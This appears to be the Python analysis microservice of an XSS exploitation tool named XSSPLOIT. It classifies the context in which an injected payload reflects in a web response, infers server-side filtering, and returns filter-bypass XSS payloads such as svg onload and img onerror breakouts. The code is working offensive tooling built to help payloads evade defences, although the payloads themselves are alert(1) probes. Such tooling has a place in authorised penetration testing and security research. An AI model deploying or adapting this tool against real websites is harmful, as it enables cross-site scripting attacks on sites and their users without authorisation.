"""
XSSPLOIT python ai-service (optional, port 8001).

Rule-based reflection analysis microservice — complements the TS engine's
AI providers. No external LLM keys required; this is the deterministic
analysis layer (context classification + filter detection). Heavy LLM work
stays in the TS tiered provider chain.
"""
from __future__ import annotations

import re
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI(title="xssploit-ai-service", version="5.0.0")

CTX_PATTERNS = {
    "html-attribute-quoted": re.compile(r'=[\'"][^\'"]*MARKER[^\'"]*[\'"]', re.I),
    "js-string-single": re.compile(r"'[^']*MARKER[^']*'"),
    "js-string-double": re.compile(r'"[^"]*MARKER[^"]*"'),
    "html-comment": re.compile(r"<!--.*?MARKER.*?-->", re.S),
    "script-block": re.compile(r"<script[^>]*>.*?MARKER.*?</script>", re.S | re.I),
    "event-handler": re.compile(r"on\w+\s*=\s*['\"][^'\"]*MARKER", re.I),
}

FILTER_HINTS = {
    "angle-brackets-stripped": re.compile(r"<|>"),
    "quotes-encoded": re.compile(r"&quot;|&#0?39;|&apos;"),
    "script-tag-blocked": re.compile(r"script", re.I),
    "event-handler-blocked": re.compile(r"on\w+\s*=", re.I),
}


class AnalyzeRequest(BaseModel):
    payload: str
    response_snippet: str
    parameter: str = ""


class AnalyzeResponse(BaseModel):
    contexts: list[str]
    filters_detected: list[str]
    suggested_mutations: list[str]
    explanation: str


@app.get("/health")
def health() -> dict:
    return {"status": "ok", "service": "xssploit-ai-service", "version": "5.0.0"}


@app.post("/analyze", response_model=AnalyzeResponse)
def analyze(req: AnalyzeRequest) -> AnalyzeResponse:
    # Plant a marker where the payload reflected, then classify surrounding context.
    snippet = req.response_snippet
    idx = snippet.find(req.payload)
    marked = snippet if idx < 0 else snippet[:idx] + "MARKER" + snippet[idx + len(req.payload):]

    contexts = [name for name, pat in CTX_PATTERNS.items() if pat.search(marked)]
    if not contexts and idx >= 0:
        contexts = ["html-body"]

    # Compare what came back vs what went in to infer server-side filtering.
    filters: list[str] = []
    if "<" in req.payload and "<" not in snippet[max(0, idx - 200): idx + len(req.payload) + 200] and idx >= 0:
        filters.append("angle-brackets-stripped")
    for name, pat in FILTER_HINTS.items():
        if name != "angle-brackets-stripped" and pat.search(snippet):
            filters.append(name)

    mutations: list[str] = []
    if "angle-brackets-stripped" in filters:
        mutations += ["%3Cimg%20src=x%20onerror=alert(1)%3E", "<img src=x onerror=alert(1)//"]
    if "quotes-encoded" in filters:
        mutations += ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
    if "js-string-single" in contexts:
        mutations.append("\\'-alert(1)//")
    if "js-string-double" in contexts:
        mutations.append('\\"-alert(1)//')
    if "event-handler" in contexts or "html-attribute-quoted" in contexts:
        mutations.append('"><svg onload=alert(1)>')

    explanation = (
        f"Payload reflected in {', '.join(contexts) or 'unknown'} context"
        + (f"; server-side filtering: {', '.join(filters)}" if filters else "; no obvious filtering")
    )
    return AnalyzeResponse(
        contexts=contexts,
        filters_detected=filters,
        suggested_mutations=mutations[:8],
        explanation=explanation,
    )


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="127.0.0.1", port=8001)
